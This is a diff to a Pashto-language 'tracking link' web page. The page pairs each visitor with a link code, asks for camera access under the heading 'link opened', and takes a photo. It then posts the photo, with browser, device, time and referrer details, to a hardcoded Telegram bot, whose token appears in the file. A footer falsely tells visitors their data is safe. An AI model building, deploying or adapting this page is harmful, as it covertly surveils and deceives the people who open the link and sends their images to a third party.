@@ -1,13 +1,19 @@
 <!DOCTYPE html>
-<html>
+<html lang="ps">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>لینک تعقیب</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -15,44 +21,222 @@
             padding: 20px;
             margin: 0;
         }
+        
         .card {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 400px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 40px 30px;
+            max-width: 420px;
             width: 100%;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
             text-align: center;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            animation: slideUp 0.6s ease-out;
         }
-        .icon { font-size: 60px; }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .icon {
+            font-size: 70px;
+            margin-bottom: 15px;
+            display: inline-block;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        h1 {
+            color: #1a1a2e;
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        
+        /* ========== د کیمرې ساحه ========== */
+        .camera-container {
+            position: relative;
+            width: 100%;
+            border-radius: 20px;
+            overflow: hidden;
+            background: #1a1a2e;
+            margin-bottom: 20px;
+            aspect-ratio: 4/3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+        
+        #canvas {
+            display: none;
+        }
+        
+        .camera-placeholder {
+            color: #888;
+            font-size: 14px;
+            padding: 20px;
+        }
+        
+        .camera-placeholder .cam-icon {
+            font-size: 50px;
+            display: block;
+            margin-bottom: 10px;
+        }
+        
+        /* ========== تڼۍ ========== */
         .btn {
             display: inline-block;
-            background: #0088cc;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-            padding: 12px 30px;
-            border-radius: 30px;
-            text-decoration: none;
-            font-weight: bold;
+            padding: 14px 35px;
+            border-radius: 50px;
+            border: none;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin-top: 5px;
+        }
+        
+        .btn:hover {
+            transform: scale(1.03);
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .btn-secondary {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
             margin-top: 10px;
         }
-        .info {
-            background: #f5f5f5;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-            font-size: 13px;
-            text-align: left;
+        
+        .btn-success {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
         }
-        .info span { color: #666; }
-        .loading { 
+        
+        /* ========== د معلوماتو ساحه ========== */
+        .info-box {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 12px;
+            text-align: left;
+            color: #555;
+            border: 1px solid #eee;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+        
+        .info-box strong {
+            color: #1a1a2e;
+        }
+        
+        .info-box .label {
+            color: #888;
+            font-size: 11px;
+        }
+        
+        .status {
+            padding: 10px;
+            border-radius: 12px;
+            margin: 10px 0;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .status.loading {
+            background: #fff3cd;
+            color: #856404;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #aaa;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+        }
+        
+        /* ========== د عکس مخکتنه ========== */
+        .preview-img {
+            width: 100%;
+            border-radius: 15px;
+            margin-top: 10px;
+            display: none;
+            border: 3px solid #4facfe;
+        }
+        
+        /* ========== ځواب ورکوونکی ډیزاین ========== */
+        @media (max-width: 480px) {
+            .card {
+                padding: 25px 20px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+            .icon {
+                font-size: 50px;
+            }
+        }
+        
+        /* ========== اسپنر ========== */
+        .spinner {
             display: inline-block;
             width: 20px;
             height: 20px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0088cc;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 10px;
         }
+        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -60,94 +244,245 @@
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon">🔗</div>
+
+    <div class="card" id="app">
+        <!-- آیکون -->
+        <div class="icon">📸</div>
+        
         <h1>لینک خلاص شو!</h1>
-        <p>ستاسو معلومات ثبت شول.</p>
-        <div class="info" id="info">
-            <span>⏳ معلومات ترلاسه کیږي...</span>
-            <div style="text-align:center;margin-top:10px;"><div class="loading"></div></div>
+        <p class="subtitle">مهرباني وکړئ د کیمرې اجازه ورکړئ</p>
+        
+        <!-- د کیمرې ساحه -->
+        <div class="camera-container" id="cameraContainer">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+            <div class="camera-placeholder" id="placeholder">
+                <span class="cam-icon">📷</span>
+                کیمره چمتو کیږي...
+            </div>
         </div>
-        <a href="https://t.me/YourBotUsername" class="btn">📱 تلګرام بوټ ته لاړ شئ</a>
-        <p style="font-size:12px;color:#999;margin-top:20px;">© 2026</p>
+        
+        <!-- د عکس مخکتنه -->
+        <img id="preview" class="preview-img" alt="عکس">
+        
+        <!-- حالت -->
+        <div id="status" class="status loading">
+            ⏳ کیمره فعالیږي...
+        </div>
+        
+        <!-- تڼۍ -->
+        <button class="btn btn-success" id="captureBtn" disabled>
+            📸 عکس واخلئ
+        </button>
+        
+        <button class="btn btn-secondary" id="retryBtn" style="display:none;">
+            🔄 بیا هڅه وکړئ
+        </button>
+        
+        <!-- د معلوماتو ساحه -->
+        <div class="info-box" id="infoBox">
+            <strong>📊 معلومات:</strong><br>
+            <span class="label">🔗 کوډ:</span> <span id="codeDisplay">نامعلوم</span><br>
+            <span class="label">🌍 براوزر:</span> <span id="browserDisplay">نامعلوم</span><br>
+            <span class="label">📱 وسیله:</span> <span id="deviceDisplay">نامعلوم</span><br>
+            <span class="label">⏰ وخت:</span> <span id="timeDisplay">نامعلوم</span>
+        </div>
+        
+        <div class="footer">
+            🔒 ټول معلومات خوندي دي • د تلګرام بوټ سره وصل
+        </div>
     </div>
 
     <script>
-        // ========== د تلګرام بوټ تنظیمات ==========
-        // دلته خپل BOT_TOKEN او خپل CHAT_ID واچوئ
+        // ========== تنظیمات ==========
         const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
-        const CHAT_ID = "8295417969"; // خپل چاټ آی ډي دلته واچوئ
+        const CHAT_ID = "8295417969"; // خپل چاټ آی ډي دلته واچوئ!
         
-        // د URL څخه کوډ ترلاسه کول
+        // ========== د URL کوډ ==========
         const params = new URLSearchParams(window.location.search);
-        const code = params.get('code');
+        const code = params.get('code') || 'نامعلوم';
         
-        // د کارونکي معلومات
-        const info = {
-            code: code || 'نامعلوم',
-            browser: navigator.userAgent,
-            language: navigator.language,
-            platform: navigator.platform,
-            time: new Date().toISOString(),
-            referer: document.referrer || 'مستقیم'
-        };
-        
-        // د براوزر معلومول
+        // ========== د براوزر معلومات ==========
         function getBrowser(ua) {
-            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
             if (ua.includes('Firefox')) return 'Firefox';
-            if (ua.includes('Safari')) return 'Safari';
-            if (ua.includes('Edge')) return 'Edge';
-            if (ua.includes('Opera')) return 'Opera';
+            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+            if (ua.includes('Edg')) return 'Edge';
+            if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
             return 'نامعلوم';
         }
         
-        // معلومات ښودل
-        document.getElementById('info').innerHTML = `
-            <strong>📊 ستاسو معلومات:</strong><br>
-            🔗 کوډ: <code>${info.code}</code><br>
-            🌍 براوزر: ${getBrowser(info.browser)}<br>
-            📱 سیسټم: ${info.platform}<br>
-            🌐 ژبه: ${info.language}<br>
-            ⏰ وخت: ${info.time.replace('T', ' ').slice(0, 16)}<br>
-            🔗 سرچینه: ${info.referer}
-        `;
+        function getDevice(ua) {
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
+                if (/iPad|Tablet/i.test(ua)) return 'ټابلیټ';
+                return 'موبایل';
+            }
+            return 'کمپیوټر';
+        }
         
-        // ========== تلګرام ته معلومات لیږل ==========
-        async function sendToTelegram() {
-            const message = 
-                `🔔 **نوی لیدونکی!**\n\n` +
-                `🌐 **لینک کوډ:** \`${info.code}\`\n` +
-                `🌍 **براوزر:** ${getBrowser(info.browser)}\n` +
-                `📱 **سیسټم:** ${info.platform}\n` +
-                `🌐 **ژبه:** ${info.language}\n` +
-                `⏰ **وخت:** ${info.time.replace('T', ' ').slice(0, 16)}\n` +
-                `🔗 **سرچینه:** ${info.referer}\n\n` +
-                `🔄 د نورو معلوماتو لپاره بوټ ته لاړ شئ!`;
-            
+        const browser = getBrowser(navigator.userAgent);
+        const device = getDevice(navigator.userAgent);
+        const time = new Date().toISOString().replace('T', ' ').slice(0, 19);
+        const referer = document.referrer || 'مستقیم';
+        
+        // ========== معلومات ښودل ==========
+        document.getElementById('codeDisplay').textContent = code;
+        document.getElementById('browserDisplay').textContent = browser;
+        document.getElementById('deviceDisplay').textContent = device;
+        document.getElementById('timeDisplay').textContent = time;
+        
+        // ========== د کیمرې فعالول ==========
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const preview = document.getElementById('preview');
+        const captureBtn = document.getElementById('captureBtn');
+        const retryBtn = document.getElementById('retryBtn');
+        const status = document.getElementById('status');
+        const placeholder = document.getElementById('placeholder');
+        const cameraContainer = document.getElementById('cameraContainer');
+        
+        let stream = null;
+        let photoTaken = false;
+        
+        async function startCamera() {
             try {
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const data = {
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                };
+                status.className = 'status loading';
+                status.innerHTML = '⏳ کیمره فعالیږي... اجازه ورکړئ!';
                 
+                // د کیمرې غوښتنه
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+                
+                video.srcObject = stream;
+                video.style.display = 'block';
+                placeholder.style.display = 'none';
+                
+                await video.play();
+                
+                status.className = 'status info';
+                status.innerHTML = '✅ کیمره چمتو ده! "عکس واخلئ" تڼۍ فشاروئ.';
+                captureBtn.disabled = false;
+                
+            } catch (error) {
+                console.log('کیمره تېروتنه:', error);
+                status.className = 'status error';
+                status.innerHTML = '❌ کیمره خلاصه نشوه! مهرباني وکړئ اجازه ورکړئ.';
+                placeholder.innerHTML = '<span class="cam-icon">🚫</span> کیمره ته لاسرسی نشته';
+                captureBtn.disabled = true;
+                retryBtn.style.display = 'block';
+            }
+        }
+        
+        // ========== عکس اخیستل ==========
+        function takePhoto() {
+            if (!stream || photoTaken) return;
+            
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // عکس په JPEG بدلول
+            const imageData = canvas.toDataURL('image/jpeg', 0.9);
+            
+            // مخکتنه ښودل
+            preview.src = imageData;
+            preview.style.display = 'block';
+            
+            photoTaken = true;
+            captureBtn.disabled = true;
+            captureBtn.textContent = '✅ عکس واخیستل شو!';
+            
+            status.className = 'status success';
+            status.innerHTML = '✅ عکس واخیستل شو! تلګرام ته استول کیږي...';
+            
+            // تلګرام ته عکس استول
+            sendPhotoToTelegram(imageData);
+        }
+        
+        // ========== تلګرام ته عکس استول ==========
+        async function sendPhotoToTelegram(imageData) {
+            try {
+                // د عکس ډاټا په Blob بدلول
+                const blob = dataURItoBlob(imageData);
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'visitor.jpg');
+                formData.append('caption', 
+                    `📸 **نوی عکس!**\n\n` +
+                    `🔗 **کوډ:** \`${code}\`\n` +
+                    `🌍 **براوزر:** ${browser}\n` +
+                    `📱 **وسیله:** ${device}\n` +
+                    `⏰ **وخت:** ${time}\n` +
+                    `🔗 **سرچینه:** ${referer}`
+                );
+                formData.append('parse_mode', 'Markdown');
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                 const response = await fetch(url, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                    body: formData
                 });
                 
                 const result = await response.json();
                 console.log('تلګرام ته واستول شو:', result);
+                
+                if (result.ok) {
+                    status.className = 'status success';
+                    status.innerHTML = '✅ عکس او معلومات تلګرام ته واستول شول!';
+                } else {
+                    throw new Error(result.description || 'نامعلومه تېروتنه');
+                }
+                
             } catch (error) {
                 console.log('تېروتنه:', error);
+                status.className = 'status error';
+                status.innerHTML = '❌ عکس واستول نشو! بیا هڅه وکړئ.';
+                retryBtn.style.display = 'block';
             }
         }
         
-        // معلومات واستوئ
-        sendToTelegram();
+        // ========== مرستندویه تابع ==========
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+        
+        // ========== بیا هڅه ==========
+        function retry() {
+            photoTaken = false;
+            preview.style.display = 'none';
+            captureBtn.disabled = true;
+            captureBtn.textContent = '📸 عکس واخلئ';
+            retryBtn.style.display = 'none';
+            startCamera();
+        }
+        
+        // ========== پیښې ==========
+        captureBtn.addEventListener('click', takePhoto);
+        retryBtn.addEventListener('click', retry);
+        
+        // ========== کیمره پیل کړئ ==========
+        startCamera();
+        
+        // ========== که کارونکی پاڼه پریږدي، کیمره بنده کړي ==========
+        window.addEventListener('beforeunload', function() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
     </script>
 </body>
 </html>
